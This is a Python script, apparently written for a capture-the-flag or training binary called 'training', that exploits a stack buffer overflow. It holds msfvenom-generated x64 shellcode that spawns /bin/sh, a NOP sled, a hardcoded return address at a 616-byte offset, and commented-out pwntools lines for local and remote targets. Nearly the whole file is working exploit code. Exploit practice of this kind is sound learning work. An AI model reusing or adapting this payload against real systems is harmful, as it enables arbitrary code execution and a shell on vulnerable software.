#!/usr/bin/env python3

#from pwn import *
import sys

#context.update(arch='i386', os='linux')

# WE can cause an overflow with 612 bytes + EIP
offset=616

# Let's choose local vs remote
#p = process("./training")
#p = remote("127.0.0.1", 4444)

#p.recvuntil("desert:")

# msfvenom -p linux/x64/exec cmd=/bin/sh  -f python -b '\x00\x0a\x0d'
# [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
# [-] No arch selected, selecting arch: x64 from the payload
# Found 4 compatible encoders
# Attempting to encode payload with 1 iterations of generic/none
# generic/none failed with Encoding failed due to a bad character (index=9, char=0x00)
# Attempting to encode payload with 1 iterations of x64/xor
# x64/xor succeeded with size 87 (iteration=0)
# x64/xor chosen with final size 87
# Payload size: 87 bytes
# Final size of python file: 447 bytes
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05\xef"
buf += b"\xff\xff\xff\x48\xbb\x4a\x41\x33\xbd\xf6\xe8\xb1\x2e\x48"
buf += b"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x02\xf9\x1c"
buf += b"\xdf\x9f\x86\x9e\x5d\x22\x41\xaa\xed\xa2\xb7\xe3\x48\x22"
buf += b"\x6c\x50\xe9\xa8\xba\x59\x26\x4a\x41\x33\x92\x94\x81\xdf"
buf += b"\x01\x39\x29\x33\xeb\xa1\xbc\xef\x44\x71\x19\x3c\xb8\xf6"
buf += b"\xe8\xb1\x2e"

# Payload: 
payload = b""
payload += b"\x90" * (offset - len(buf) - 200)
payload += buf
payload += b"\x90" * 200
payload += b"\xf0\xda\xff\xff\xff\x7f\x00\x00"

sys.stdout.buffer.write(payload)

